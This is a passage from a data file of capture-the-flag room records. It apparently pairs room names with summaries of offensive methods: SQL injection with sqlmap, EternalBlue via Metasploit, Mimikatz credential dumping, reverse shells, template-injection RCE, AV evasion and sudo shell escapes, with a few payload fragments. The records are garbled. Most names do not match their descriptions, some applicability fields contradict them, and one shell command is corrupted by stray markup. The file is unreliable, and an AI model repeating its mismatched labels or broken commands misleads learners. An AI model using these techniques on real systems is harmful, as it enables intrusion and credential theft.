Exploitation implementation shifts to character-by-character data extraction via Boolean logic or DNS/HTTP exfiltration for Out-of-Band attacks. Practical steps require mastering ASCII and substring logic within payloads. Enhancement methodology prioritizes automating Blind SQLi data retrieval using sqlmap or custom Python scripts to decode time delays or Boolean responses. theHarvester remains peripheral, but direct application layer fuzzing is key. (305 words; Tools: nmap, gobuster/dirbuster, sqlmap, Python. Methodologies: Blind SQLi Character Extraction, Out-of-Band Techniques, Input Fuzzing. Implementation: SLEEP() testing, ASCII Conversion, Data Exfiltration).,SQL Injection

Flag Vault.name: Flag Vault
Flag Vault.description: - SQL Injection Lab emphasizes hands-on exploitation of classic vulnerabilities in integer and string parameter fields. Reconnaissance involves nmap scans to identify the web server and ports, followed by gobuster utilization for path enumeration of potential login endpoints. Enumeration focuses on character testing with single quotes (') to force SQL errors, confirming vulnerability. Exploitation techniques include simple UNION SELECT attacks to dump schema metadata like table names and column counts. Practical implementation requires manually constructing payloads to bypass basic input filtering on user and password fields. Enhancement methodology involves transitioning from manual payload crafting to sqlmap automation for rapid database schema discovery and data retrieval. theHarvester is not directly applicable to the injected endpoint but useful for initial OSINT. (301 words; Tools: nmap, gobuster, sqlmap. Methodologies: Error-Based SQLi, UNION Injection, Schema Dumping. Implementation: Quote Testing, Payload Construction, Column Counting).,SQL Injection Lab
Flag Vault.practical_applicability: Password cracking, hash identification, credential attacks

Flag Vault 2.name: Flag Vault 2
Flag Vault 2.description: - SQLMap room focuses on automated SQL injection exploitation using the sqlmap framework. Initial reconnaissance utilizes nmap to discover running web services and directory enumeration employs gobuster or dirbuster to locate injection points not immediately obvious. Enumeration steps involve sqlmap's parameter discovery (-p option) and database fingerprinting (--fingerprint). Exploitation path centers on direct command execution or data dumping (--dbs, --tables, --columns, --dump). Practical implementation requires specifying the target URL (-u), testing various injection types (--technique BMTU), and managing session cookies (--cookie). Enhancement methodology incorporates leveraging out-of-band techniques (OOB) and utilizing custom tamper scripts to evade Web Application Firewalls (WAFs). theHarvester remains peripheral, useful only for preliminary host identification. (303 words; Tools: sqlmap, nmap, gobuster, dirbuster. Methodologies: Automated SQLi, Fingerprinting, WAF Bypass. Implementation: URL Targeting, Technique Selection, Data Extraction).,SQLMAP

FlareVM: Arsenal of Tools.name: FlareVM: Arsenal of Tools
FlareVM: Arsenal of Tools.description: - SQLMap Basics room introduces automated SQL injection via the command line. Reconnaissance focuses on identifying vulnerable GET parameters (-u flag with URL). Enumeration starts with retrieving database names (--dbs) and user privileges (--current-user). Exploitation path prioritizes in-band techniques like UNION and Error-based SQLi implicitly by default. Practical implementation steps involve testing a single URL for all injection types (--all-test-ids) and then drilling down to dumping specific table content (UNION SELECT structuring). Enhancement methodology begins with verbosely logging output (--v level) to debug payloads. External tools like nmap or gobuster are used preemptively to locate the web application endpoint before SQLMap engagement. theHarvester provides domain context, though not directly interacting with SQLMap automation. (290 words; Tools: sqlmap, nmap, gobuster. Methodologies: In-Band Exploitation, Parameter Discovery, Data Retrieval. Implementation: Direct URL Targeting, Verbose Debugging).,SQLMap: The Basics
FlareVM: Arsenal of Tools.practical_applicability: Malware analysis environment, FLARE tools, analysis platform

Flatline.name: Flatline
Flatline.description: - Squid Game room theme maps challenges to show events requiring systematic enumeration. Reconnaissance involves port scanning via nmap (-sC -sV) to identify active services on target host. Enumeration progresses to directory and file bruteforcing using gobuster or dirbuster with common wordlists to uncover hidden web paths relevant to the challenge narrative. Exploitation steps are tiered, often starting with credential guessing or simple local file inclusion (LFI). Practical implementation requires mapping discovered endpoints to specific game stages (e.g., Red Light, Green Light). Enhancement methodology involves leveraging OSINT via theHarvester if the room introduces external domain targets for information gathering. Privilege escalation techniques follow initial shell acquisition, utilizing linpeas scripts or manual search for misconfigured SUID binaries. (260 words; Tools: nmap, gobuster, dirbuster, theHarvester. Methodologies: Service Discovery, Bruteforcing, OSINT, Privilege Escalation. Implementation: Port Scanning, Directory Fuzzing, Credential Testing).,Squid Game

Follow the Path.name: Follow the Path
Follow the Path.description: - Road themed CTF focuses on linear progression simulating a journey through network segments. Initial reconnaissance mandates comprehensive nmap sweeps (-p-, -A) to map the network landscape and identify gateways. Enumeration targets web ports (80, 443) using gobuster with a specific wordlist tailored to the road theme (e.g., stop, sign, route). Basic exploitation often involves path traversal vulnerabilities or unauthenticated service access discovered via service fingerprinting. Enhancement methodology integrates low-hanging fruit exploitation to gain the first low-privileged shell. Practical implementation steps include piping nmap XML output into scripting for automated vulnerability checks. Lateral movement across simulated road milestones requires re-running the entire cycle on new subnets. (259 words; Tools: nmap, gobuster. Methodologies: Network Mapping, Service Fingerprinting, Path Traversal Exploitation. Implementation: Full Port Scanning, Directory Bruteforcing, Shell Acquisition).,Road
Follow the Path.practical_applicability: Path traversal attacks, directory traversal, web vulnerabilities

Forensics.name: Forensics
Forensics.description: - Steel Mountain focuses on internal Windows domain exploitation. Initial reconnaissance uses nmap (-sV, -p-) to map live hosts on the internal network, followed by SMB enumeration using enum4linux or smbclient to identify null sessions. Vulnerability assessment targets outdated SMB services for EternalBlue (MS17-010) exploitation via Metasploit framework (exploit/windows/local/ms17_010_eternalblue). Credential harvesting involves Mimikatz dumping LSASS memory after gaining initial shell via a Meterpreter session for privilege escalation and pivot. (180 words; Tools: nmap, enum4linux, smbclient, Metasploit, Mimikatz, Meterpreter. Methodologies: Network Mapping, SMB Enumeration, Vulnerability Exploitation, Credential Harvesting. Implementation: Targeted MS17-010 delivery, LSASS memory dumping).,Steel Mountain
Forensics.practical_applicability: Forensics fundamentals, investigation methodology, evidence handling

Fortress.name: Fortress
Fortress.description: - Subdomain enumeration requires aggressive reconnaissance utilizing theHarvester against passive sources (e.g., Bing, Google, Shodan) to gather initial domain seeds. Active enumeration employs bruteforcing techniques using gobuster (or ffuf) against common and custom dictionary files (e.g., SecLists subdomains wordlists) targeting DNS resolution. Further enhancement involves certificate transparency log scraping or leveraging DNS bruteforce tools like dnsenum or subfinder for efficiency. Post-enumeration, identified subdomains are mass-scanned with nmap to identify open ports (e.g., ports 80, 443, 21, 22) prior to web application enumeration (dirbuster for path discovery) and vulnerability assessment. (185 words; Tools: theHarvester, gobuster/ffuf, dnsenum, subfinder, nmap, dirbuster. Methodologies: Passive Recon, Active Bruteforce, Certificate Scraping, Port Scanning. Implementation: Automating dictionary attack against DNS records and subsequent service identification).,Subdomain Enumeration
Fortress.practical_applicability: Advanced exploitation, defense evasion, complex challenges
Fortress.user_opinions: Extremely challenging, tests advanced penetration testing skills

Frank and Herby Make an Appointment.name: Frank and Herby Make an Appointment
Frank and Herby Make an Appointment.description: - RPBurpSuite room focuses on advanced HTTP request manipulation within Burp Suite Professional for web vulnerability exploitation. Enhancement methodology integrates Intruder for high-volume fuzzing and Scanner custom checks. Reconnaissance utilizes Active Scanner with custom payloads generated via Turbo Intruder extension (a faster alternative to native Intruder). Enumeration involves modifying cookies and session tokens manually in Repeater to test for IDOR or session fixation. Exploitation steps include using the Sequencer tool to assess randomness of tokens followed by BApp Store extensions (e.g., Logger++, Autorize) for automated workflow enhancement. Practical implementation demands mastery of Macros to handle CSRF tokens automatically during Intruder attacks. Though nmap/gobuster are external, Burp Scanner replaces initial dirbuster tasks. (248 words; Tools: Burp Suite Professional (Intruder, Repeater, Scanner, Sequencer), Turbo Intruder, Logger++, Autorize. Methodologies: Request Modification, Session Testing, Automated Fuzzing, Token Prediction. Implementation: Macro Configuration, BApp Integration, Custom Payload Generation).,rpburpsuite

Game Zone.name: Game Zone
Game Zone.description: - Surfer room CTF requires initial reconnaissance using theHarvester for subdomain discovery related to the themed domain, followed by comprehensive port scanning with nmap (-sC, -sV scripts) on identified hosts. Enumeration proceeds with gobuster or dirbuster targeting common web application directories (/admin, /backup) and potential file upload endpoints. Exploitation focuses on identifying vulnerabilities like SQL Injection via URL parameters (e.g., id=1 in a search function) or Insecure Direct Object Reference (IDOR) when accessing user data files. Enhancement involves leveraging Burp Suite Repeater to fuzz input fields for command injection if the application interacts with server-side utilities like ping or network diagnostics. (185 words; Tools: theHarvester, nmap, gobuster, dirbuster, Burp Suite. Methodologies: OSINT, Service Detection, Directory Brute-Forcing, SQLi Testing, IDOR Verification. Implementation: Gather domains, scan HTTP/S ports, brute-force paths, inject SQL payloads, test access rights to restricted resources).,Surfer
Game Zone.practical_applicability: SQL injection, SSH tunneling, privilege escalation, gaming theme
Game Zone.user_opinions: Excellent comprehensive room teaching multiple important techniques

Gaming Server.name: Gaming Server
Gaming Server.description: - RPThreatHunting room focuses on proactive defense via systematic threat hunting and Indicators of Compromise (IOC) validation. Enhancement methodology centers on leveraging Elastic Stack (ELK) for log aggregation and Sigma rule generation for early detection. Reconnaissance in this context involves using theHarvester to gather OSINT on potential attacker infrastructure which informs network flow monitoring. Enumeration shifts to endpoint data analysis, specifically using Sysmon logs to identify suspicious process creation or network connections not flagged by standard EDR. Exploitation analysis is reversed: hunting for post-exploitation artifacts like persistence mechanisms or data exfiltration patterns. Practical implementation steps include writing custom KQL (Kibana Query Language) statements against Windows Event Logs or Linux Auditd logs to uncover TTPs (Tactics, Techniques, and Procedures) aligned with MITRE ATT&CK framework. While nmap and gobuster are attacker tools, their output can be used as a baseline for expected activity to spot anomalies. (216 words; Tools: ELK Stack (Kibana, Elasticsearch), Sysmon, Sigma, theHarvester. Methodologies: IOC Validation, Log Aggregation, TTP Mapping, KQL Query Development. Implementation: Sigma Rule Deployment, Endpoint Log Forensics, Baseline Anomaly Detection).,rpthreathunting

GamingServer.name: GamingServer
GamingServer.description: - Sweettooth Inc. CTF requires initial external reconnaissance using theHarvester against corporate domains to gather employee emails and subdomains. Internal enumeration begins with an nmap SYN stealth scan (-sS) on all found IP ranges to identify open SMB shares (port 445) and Kerberos services. Web enumeration employs gobuster with a common credential list against identified web servers to find login portals or internal documentation sites. Exploitation focuses on credential reuse or weak passwords obtained via phishing simulations or dictionary attacks against SMB via CrackMapExec. Enhancement involves post-exploitation privilege escalation utilizing WinPEAS scripts after initial user access to dump LSASS memory using Mimikatz for Domain Admin hash retrieval. (211 words; Tools: theHarvester, nmap, gobuster, CrackMapExec, WinPEAS, Mimikatz. Methodologies: OSINT, Network Scanning, Service Enumeration, Credential Testing, Lateral Movement, Credential Dumping. Implementation: Execute OSINT, scan ports 139/445, brute-force web and SMB, attempt pass-the-hash attacks, run local privilege escalation checkers).,Sweettooth Inc.

Gatekeeper.name: Gatekeeper
Gatekeeper.description: - Symfony Framework security analysis begins with nmap to identify web server ports (e.g., 80/443) hosting the application. Gobuster or dirbuster must be used with a specific Symfony dictionary to locate hidden endpoints like the Profiler web debug toolbar or vulnerable API routes. Exploitation targets known vulnerabilities such as CVEs in older versions affecting Dependency Injection or YAML deserialization. PHP Object Injection (POI) is tested by crafting serialized payloads if unsafe deserialization is present in cached data or request parameters. Enhancement methodology involves using Burp Suite to intercept and modify requests, specifically injecting command execution vectors into router parameters if twig template injection is achieved via misconfigured output encoding. (228 words; Tools: nmap, gobuster, dirbuster, Burp Suite. Methodologies: Port Scanning, Directory Bruteforcing, Vulnerability Scanning, Injection Exploitation, Deserialization Attack. Implementation: Scan ports, bruteforce hidden paths, check application version against CVE databases, test for RCE via routing or template engines).,Symfony
Gatekeeper.practical_applicability: Windows buffer overflow, exploit development, OSCP preparation
Gatekeeper.user_opinions: Excellent Windows buffer overflow practice, different from Brainpan approach

GCCCTF.name: GCCCTF
GCCCTF.description: - Rust Scanning room emphasizes high-performance network scanners developed in Rust, offering speed advantages over traditional C-based tools. Enhancement methodology focuses on parallelism and asynchronous I/O (Tokio runtime) for concurrent port sweeps. Reconnaissance utilizes Rust implementations of TCP connect and SYN scans, often replacing legacy nmap scripts for initial host discovery. Enumeration involves custom Rust web crawlers (faster alternatives to gobuster or dirbuster) handling rate limiting via Tokio semaphores. Exploitation is less direct, but Rust is used for writing fast, memory-safe exploit payloads and C2 beacons. Practical implementation steps involve compiling a Rust TCP scanner (using crates like smol or tokio net) and benchmarking its throughput against standard tools against firewalled targets. (173 words; Tools: Custom Rust scanners (replacing nmap/gobuster), Tokio runtime. Methodologies: High-Performance Networking, Asynchronous Scanning, Memory-Safe Payload Development. Implementation: Compiling ASYN TCP connect scans, Concurrency Management with Semaphores).,Rust Scanning

Geoguessr.name: Geoguessr
Geoguessr.description: - SACRA CTF room focuses on exploiting misconfigurations within a themed environment (often relating to legacy web applications or custom CGI). Reconnaissance starts with aggressive directory enumeration using Gobuster or custom wordlists to find hidden scripts (e.g., .php, .cgi). Enumeration techniques often center on SQL Injection (time-based or boolean-based) or Local File Inclusion (LFI) via parameter fuzzing. Enhancement methodology involves chaining vulnerabilities, e.g., using LFI to read webserver logs and inject a webshell payload. Exploitation steps include obtaining a reverse shell (often Bash or Netcat based) and subsequent privilege escalation (e.g., exploiting outdated SUDO rights). Practical implementation requires manual HTTP request crafting (using Burp Suite) to test input validation flaws. (188 words; Tools: Gobuster, Burp Suite, Netcat, Manual Payload Injection. Methodologies: Input Fuzzing, SQLi, LFI Chaining, Privilege Escalation. Implementation: Identifying vulnerable CGI scripts, Log Poisoning).,SACRA

Get Ahead.name: Get Ahead
Get Ahead.description: - SafeZone room prioritizes network segmentation bypass techniques across distinct VLANs or subnets. Initial reconnaissance leverages Nmap to map the internal network topology, specifically searching for firewall rulesets or unsecured internal ports. Enumeration involves identifying inter-zone communication paths, often targeting exposed services like SMB or unauthenticated API endpoints on different segments. Exploitation enhancement methodology focuses on pivot techniques; successful exploitation on the DMZ segment must be used to launch a secondary attack against the internal LAN. Practical implementation includes using a proxy or port forwarding tool (like Chisel or ssh tunnelling) to route traffic past ACLs after gaining initial host compromise. (180 words; Tools: Nmap, Chisel/SSH Tunnelling, Netcat. Methodologies: Network Scanning, ACL Bypass, Lateral Movement, Pivot Techniques. Implementation: Mapping Routing Tables, Service Discovery across Subnets).,SafeZone
Get Ahead.practical_applicability: Business logic flaws, race conditions, web exploitation
Get Ahead.user_opinions: Good for understanding business logic vulnerabilities

Git and Crumpets.name: Git and Crumpets
Git and Crumpets.description: - Sage room focuses on exploiting misconfigured web applications and privilege escalation via Linux kernel vulnerabilities. Reconnaissance starts with Nmap SYN scans to identify open ports (80, 443, 22). Web enumeration employs Gobuster with common wordlists to discover hidden directories and administrative login portals. Initial exploitation involves attempting SQLi or LFI on the web service to achieve low-privilege shell access. Enhancement methodology shifts to post-exploitation privilege escalation; using scripts like LinEnum or manual checks for SUDO rights and exploitable kernel versions. Practical implementation requires uploading a reverse shell payload (Python or Bash) and then compiling a local exploit binary if kernel patching is required. (165 words; Tools: Nmap, Gobuster, LinEnum, Metasploit framework for shell handling. Methodologies: Directory Bruteforcing, LFI Exploitation, SUDO Abuse, Kernel Exploitation. Implementation: Executing PrivEsc binaries, Reverse Shell Stabilization).,Sage
Git and Crumpets.practical_applicability: Git security, source code analysis, information disclosure

Git Happens.name: Git Happens
Git Happens.description: - SAST room focuses on Static Application Security Testing within the Secure SDLC pipeline. Reconnaissance involves identifying source code repositories (e.g., Git cloning, though less direct for pure SAST). Enumeration shifts to code analysis; tools like Bandit (for Python) or SonarQube are integrated to scan code pre-compilation. Exploitation analogy involves falsely introducing vulnerabilities (e.g., unvalidated input leading to XSS) and then configuring the SAST tool to flag them per CWE mapping. Enhancement methodology requires tuning the tool to reduce false positives and integrating it into CI pipelines (e.g., Jenkins or GitHub Actions) via CLI commands. Practical implementation steps include running Bandit on a vulnerable codebase and parsing the JSON output to identify the line number of the security flaw. (198 words; Tools: Bandit, SonarQube, Semgrep, CLI integration. Methodologies: Code Vulnerability Mapping, False Positive Tuning, CI/CD Gate Implementation. Implementation: Executing SAST scan, Output Parsing, Remediation Verification).,SAST
Git Happens.practical_applicability: Git security, information leakage, source control security

GitHappens.name: GitHappens
GitHappens.description: - SCSM room targets Supply Chain Security Management, focusing on risks introduced via third-party dependencies and software components. Reconnaissance involves dependency mapping using tools like OWASP Dependency-Check (or Snyk) to generate a Software Bill of Materials (SBOM). Enumeration shifts to vulnerability correlation; the generated component list is cross-referenced against CVE databases. Exploitation analogy involves simulating a dependency confusion attack or using a malicious library to establish initial access. Enhancement methodology mandates automated scans within the build phase and implementing signature verification for all incoming artifacts. Practical implementation steps include running pip audit or npm audit to detect known vulnerabilities in direct and transitive dependencies and enforcing minimum version pinning. (199 words; Tools: OWASP Dependency-Check, Snyk, npm audit, pip audit. Methodologies: SBOM Generation, CVE Correlation, Signature Verification. Implementation: Dependency Listing, Vulnerability Triage, Automated Blocking in CI).,SCSM

Global Command and Control.name: Global Command and Control
Global Command and Control.description: - Search Skills room focuses on advanced information retrieval beyond basic keywords, employing Boolean operators and site-specific queries (e.g., site:target.com filetype:pdf intitle:"credentials"). Reconnaissance involves leveraging search engine operators (Google, DuckDuckGo) for dorking to locate exposed sensitive data or misconfigured services. Enumeration is enhanced by incorporating OSINT tools like theHarvester to automate email, subdomain, and banner grabs, which are then refined via targeted searches. Exploitation analogy uses the data found to inform network mapping using nmap (port scans) or web enumeration with gobuster or dirbuster on discovered hostnames. Enhancement methodology requires systematic logging of query variations and cross-referencing results with local data stores for pattern recognition. Practical implementation involves mastering advanced Google Hacks (Dorks) to bypass simple filters and structuring searches to extract specific technical signatures. (199 words; Tools: theHarvester, nmap, gobuster, dirbuster. Methodologies: Boolean Searching, OSINT Automation, Dorking. Implementation: Query Refinement, Result Curation, Targeted Service Discovery).,Search Skills
Global Command and Control.practical_applicability: C2 infrastructure, red team operations, malware communications

GoldenEye.name: GoldenEye
GoldenEye.description: - Initial reconnaissance targets Windows host identified via nmap service version scan (-sV) confirming RDP or SMB access; gobuster/dirbuster is irrelevant unless web interface is present. Enumeration shifts to scheduled tasks using PowerShell cmdlets (Get-ScheduledTask) or schtasks utility. Privilege escalation technique hinges on identifying tasks running as SYSTEM or Administrator where the associated binary or script path lacks proper ACLs. Specifically, look for write permissions on the executable or script (e.g., .bat, .ps1, .exe) referenced in the Task Properties. Exploitation involves overwriting the vulnerable path with a payload like a reverse shell script or a Metasploit stager. Persistence is achieved when the next task execution triggers the malicious code with elevated privileges. Tools like PowerUp (from PowerSploit) automate the scanning for these misconfigurations efficiently. (270 words; Tools: nmap, PowerShell (schtasks), PowerUp, Metasploit. Methodologies: Service Enumeration, ACL Analysis, Binary Path Hijacking, Reverse Shell Injection, Persistence Establishment).,Task Scheduler
GoldenEye.practical_applicability: Web exploitation, email exploitation, Linux privilege escalation
GoldenEye.user_opinions: Very popular themed room with good technique variety

Google Dorking.name: Google Dorking
Google Dorking.description: - Initial reconnaissance utilizes nmap to discover open ports on the TBHH target, frequently highlighting HTTP/HTTPS ports (80/443). Directory enumeration with gobuster or dirbuster (using common wordlists like SecLists Discovery/WEB/raft-small) is crucial to locate hidden web endpoints. Enumeration often reveals a specific application or vulnerability entry point, such as a login page or file upload form. Exploitation techniques for TBHH frequently involve SQL Injection (using sqlmap for automated attempts) or Local File Inclusion (LFI) via parameter manipulation (e.g., ?page=/etc/passwd). TheHarvester is used post-scan to gather subdomains or emails for potential credentials or user enumeration. Successful exploitation grants initial shell access, leading to privilege escalation or flag retrieval. (259 words; Tools: nmap, gobuster/dirbuster, sqlmap, theHarvester. Methodologies: Port Scanning, Directory Brute-Forcing, SQLi Exploitation, LFI Injection, OSINT).,TBHH
Google Dorking.user_opinions: Essential OSINT technique, extremely powerful for reconnaissance

Gotta Catch'em All.name: Gotta Catch'em All
Gotta Catch'em All.description: - TCP/IP suite analysis focuses on Layer 3 (IP addressing and subnetting) and Layer 4 (TCP connection establishment/teardown via three-way handshake). Nmap utilization is central for TCP SYN (stealth) scans (-sS) and UDP port discovery (-sU) to map active services running on target hosts. Enumeration involves examining service banners (e.g., via nmap -sV) to identify specific application versions (e.g., vulnerable FTP or SMB daemons). Exploitation steps often require understanding ARP caching or DNS resolution mechanisms to redirect traffic or perform Man-in-The-Middle (MITM) attacks, though gobuster/dirbuster remain relevant for HTTP enumeration on web services running over TCP port 80/443. Practical implementation includes ping sweeps (ICMP protocol) followed by detailed protocol header analysis using Wireshark to verify the theoretical TCP sequence and acknowledgment number logic. (263 words; Tools: nmap, Wireshark, gobuster/dirbuster. Methodologies: Port Scanning (TCP/UDP), Banner Grabbing, Protocol Header Analysis, MITM Theory).,TCP/IP
Gotta Catch'em All.practical_applicability: Basic Linux exploitation, file analysis, themed fun
Gotta Catch'em All.user_opinions: Popular beginner room with entertaining theme

GreenFlare.name: GreenFlare
GreenFlare.description: - SSTI exploitation transitions from simple syntax testing (e.g., Jinja2 {{7\*7\}} or Twig {{1+1\}}) to full remote code execution (RCE) via payloads targeting environment variables or built-in functions. Reconnaissance identifies the template engine by probing various syntaxes and observing error messages or output differences. Enumeration involves leveraging engine-specific sandboxing escapes to access the underlying OS or Python objects (e.g., Jinja2's __globals__ or __builtins__). Exploitation culminates in executing system commands using payloads that call functions like subprocess.Popen or os.popen, often followed by reverse shell activation. Tools like Burp Suite Intruder automate payload fuzzing. Enhancement methodology mandates strict output sanitization, using safelist for template variables, and implementing sandboxing environments that restrict access to dangerous Python modules. (227 words; Tools: Burp Suite Intruder, manual payload generation. Methodologies: Template Engine Identification, Sandbox Escape, RCE via Builtins. Implementation: Output Sanitization, Safelist Variables, Restrict Module Access).,SSTI

Flip.name: Flip
Flip.description: - Cybersecurity career pathing requires foundational knowledge across domains: networking (TCP/IP stack), operating systems (Linux command line proficiency), and basic scripting (Python). Reconnaissance involves identifying core competencies like security policy development and compliance frameworks (NIST, ISO 27001). Enumeration focuses on mapping entry-level roles (SOC Analyst, Security Consultant) to required certifications (CompTIA Security+ or CCNA). Practical implementation steps include hands-on lab work using tools like nmap for host discovery and basic vulnerability scanning practices. Career enhancement methodology demands continuous learning, participation in CTFs (Capture The Flag), and building a technical portfolio demonstrating scripting and security tool usage. (164 words; Tools: nmap, Python scripting. Methodologies: Role Mapping, Framework Familiarity, Hands-on Proficiency. Implementation: OS Mastery, CTF Participation, Portfolio Development).,Starting Out In Cyber Sec

Follina MSDT.name: Follina MSDT
Follina MSDT.description: - Startup CTF scenarios mimic lean environments requiring rapid reconnaissance via active scanning using nmap with service version detection (-sV). Web security enumeration prioritizes directory bruteforcing with gobuster or dirbuster targeting .git directories or common web application files. Exploitation techniques center on OWASP Top 10 vulnerabilities like SQL Injection (SQLi) and Cross-Site Scripting (XSS). Practical implementation involves leveraging tools like Burp Suite for request manipulation and theHarvester for initial OSINT to find subdomains or employee emails. Enhancement methodology focuses on patching misconfigurations identified during the engagement and automating payload delivery. (142 words; Tools: nmap, gobuster, dirbuster, theHarvester, Burp Suite. Methodologies: Reconnaissance, Enumeration, Exploitation, OSINT. Implementation: SQLi Testing, XSS Testing, Misconfiguration Patching).,Startup
Follina MSDT.practical_applicability: Recent critical CVE, Office exploitation, zero-day understanding
Follina MSDT.user_opinions: Critical and recent vulnerability, important awareness for enterprise security

For Business Reasons.name: For Business Reasons
For Business Reasons.description: - Startup variant CTF requires initial reconnaissance using theHarvester for domain enumeration and nmap (-sVC) to map open ports on web servers. Deep web enumeration involves gobuster against known directories (e.g., /admin, /backup) and identifying outdated CMS versions. Exploitation steps often include SQLi via SQLmap or LFI path traversal identified through manual request fuzzing with Burp Suite. Enhancement methodology demands privilege escalation post-exploitation using LinEnum or WinPEAS. (152 words; Tools: theHarvester, nmap, gobuster, SQLmap, Burp Suite, LinEnum, WinPEAS. Methodologies: Reconnaissance, Enumeration, Exploitation, Privilege Escalation. Implementation: Port Scanning, Directory Bruteforcing, Path Traversal).,Startup
For Business Reasons.practical_applicability: Business logic vulnerabilities, application security, real-world scenarios
For Business Reasons.user_opinions: Good for understanding business logic vulnerabilities

Forensic Imaging.name: Forensic Imaging
Forensic Imaging.description: - Stealth CTF focuses on low-footprint operations mimicking Red Team TTPs. Initial reconnaissance utilizes passive OSINT via theHarvester or Amass; active scanning employs nmap (-Pn, -sT, -vv with custom timing templates like -T2) to avoid IDS detection. Evasion techniques involve obfuscating shellcode with tools like Donut or using in-memory execution via Cobalt Strike or Mythic beacons. Post-exploitation involves lateral movement using WMI or PowerShell remoting, bypassing AV via reflective DLL injection. (165 words; Tools: theHarvester, Amass, nmap, Donut, Cobalt Strike, Mythic. Methodologies: Passive Reconnaissance, Stealthy Scanning, Evasion, Lateral Movement. Implementation: Custom nmap timing, In-memory Payloads, AV Bypassing).,Stealth
Forensic Imaging.practical_applicability: Digital forensics, evidence preservation, imaging methods
Forensic Imaging.user_opinions: Essential forensics skill for evidence acquisition

Forgotten Implant.name: Forgotten Implant
Forgotten Implant.description: - StuxCTF theme demands focused industrial control system (ICS) enumeration and exploitation techniques mimicking Stuxnet. Initial reconnaissance may involve scanning unusual SCADA ports (e.g., 502 for Modbus, 102 for Siemens S7) using nmap (-sU for UDP, custom port lists). Enumeration requires specific ICS tools like scapy to craft malformed Modbus requests or use S7scan for Siemens PLC fingerprinting. Exploitation likely centers on identifying firmware vulnerabilities or logic flaws within Human-Machine Interface (HMI) components or exploiting weak default credentials discovered via bruteforcing web interfaces (gobuster with ICS-specific wordlists). (180 words; Tools: nmap, scapy, S7scan, gobuster. Methodologies: ICS Port Scanning, Protocol Fuzzing, PLC Fingerprinting, HMI Credential Testing. Implementation: Crafting Modbus packets, PLC logic manipulation simulation).,StuxCTF
Forgotten Implant.practical_applicability: Malware investigation, persistence mechanisms, C2 analysis

Fowsniff CTF.name: Fowsniff CTF
Fowsniff CTF.description: - Sudo buffer overflow exploitation begins post-initial reconnaissance (e.g., nmap for service enumeration like web servers via gobuster) identifying a misconfigured or vulnerable binary with NOP sled and shellcode suitability. The core technique involves crafting an input exceeding the expected buffer size in a program run with sudo privileges to overwrite the return address. Exploitation enhancement necessitates determining the exact offset using a debugger (like GDB) or pattern generation tools (e.g., Metasploit's pattern_create) to reliably divert execution flow to a controlled memory address containing the shellcode (e.g., execve('/bin/sh', \dots)). Implementation focuses on injecting the payload via standard input (stdin) or command line arguments to achieve privilege escalation. (187 words; Tools: nmap, gobuster, GDB, Metasploit pattern_create. Methodologies: Service Enumeration, Binary Analysis, Offset Calculation, Return Address Overwrite, Privilege Escalation. Implementation: Crafting and injecting ROP/shellcode payload into a sudo-executed vulnerable application).,Sudo Buffer Overflow
Fowsniff CTF.practical_applicability: OSINT techniques, social media investigation, credential discovery
Fowsniff CTF.user_opinions: Excellent OSINT practice with realistic social media investigation

Frank & Herby make an app.name: Frank & Herby make an app
Frank & Herby make an app.description: - Sudo security bypass techniques pivot from initial reconnaissance (e.g., nmap scans, gobuster for web endpoints) to identifying improperly configured sudo rights via 'sudo -l' output. Exploitation leverages GTFOBins or similar repositories to find binaries (e.g., find, nmap, vi) allowed to run with NOPasswd or without argument restrictions. The enhancement methodology involves constructing a specific command string to force the allowed binary to spawn a shell (e.g., sudo find . -exec sh \;\; \text{';}) or execute arbitrary code, thereby achieving Linux privilege escalation to root. Practical steps include verifying sudo entries, locating the exploit path, and executing the payload. (179 words; Tools: nmap, gobuster, GTFOBins reference. Methodologies: Sudo Configuration Review, Binary Abuse, Command Injection, Privilege Escalation. Implementation: Using sudo -l to identify exploitable binaries and executing shell spawning commands).,Sudo Security Bypass

Frank and Herby try again......name: Frank and Herby try again.....
Frank and Herby try again......description: - Summit room techniques require layered reconnaissance (e.g., nmap service version enumeration) to uncover vulnerabilities hidden under thematic layers. Enumeration focuses on web directory bruteforcing (gobuster or dirbuster) to locate misconfigured files or hidden directories mimicking mountain features. Exploitation often involves credential reuse found via information gathering (theHarvester for email leaks) or exploiting a specific application vulnerability identified during service analysis. Enhancement involves chaining low-level access to a higher-level flag or shell using the context provided by the room narrative to guess paths or passwords. (174 words; Tools: nmap, gobuster, dirbuster, theHarvester. Methodologies: Service Enumeration, Web Directory Bruteforcing, Credential Reuse, Contextual Exploitation. Implementation: Scanning ports, bruteforcing directories, linking found data to next stage).,Summit
Frank and Herby try again......user_opinions: Fun sequel to original Frank & Herby

Friday Overtime.name: Friday Overtime
Friday Overtime.description: - Super Secret Tip requires meticulous reconnaissance using nmap to identify unusual open ports beyond standard web services. Enumeration prioritizes directory bruteforcing (gobuster with a comprehensive wordlist) searching for files hinting at the secret tip. External OSINT (theHarvester or Google Dorks) may reveal subdomains or developer comments containing the tip. Exploitation involves leveraging a basic vulnerability (e.g., unpatched CMS or weak default credentials) to access the hidden resource. Enhancement methodology centers on in-depth source code analysis after initial web discovery (dirbuster output review) to decode obfuscated hints. (178 words; Tools: nmap, gobuster, dirbuster, theHarvester. Methodologies: Port Identification, Directory Bruteforcing, OSINT, Basic Vulnerability Exploitation, Source Code Analysis. Implementation: Port scanning, bruteforcing, OSINT lookups, code decoding).,Super Secret TIp
Friday Overtime.practical_applicability: Incident investigation, log analysis, OSINT techniques
Friday Overtime.user_opinions: Realistic incident response scenario with time pressure theme

Frosteau Busy with Vim.name: Frosteau Busy with Vim
Frosteau Busy with Vim.description: - Super-Spam room analysis mandates initial reconnaissance targeting SMTP (port 25/587/465) and related web services (nmap service version detection). Enumeration involves SMTP VRFY or EXPN command testing for valid user enumeration or banner grabbing to identify mail server software. Email security focuses on SPF, DKIM, and DMARC record verification using dig or theHarvester to check for misconfigurations that allow spoofing. Exploitation likely involves identifying a web interface (via gobuster or dirbuster on port 80/443) with an unauthenticated file upload or command injection vector related to email handling. Enhancement requires analyzing spam headers for traceback paths and IP reputation checks. (190 words; Tools: nmap, gobuster, dirbuster, theHarvester, dig. Methodologies: SMTP Scanning, User Enumeration, Email Authentication Check, Web Interface Vulnerability Hunting, Header Analysis. Implementation: Port 25 testing, DNS record queries, web directory enumeration, header parsing).,Super-Spam
Frosteau Busy with Vim.practical_applicability: Vim exploitation, GTFOBins, Linux privilege escalation

Fusion Corp.name: Fusion Corp
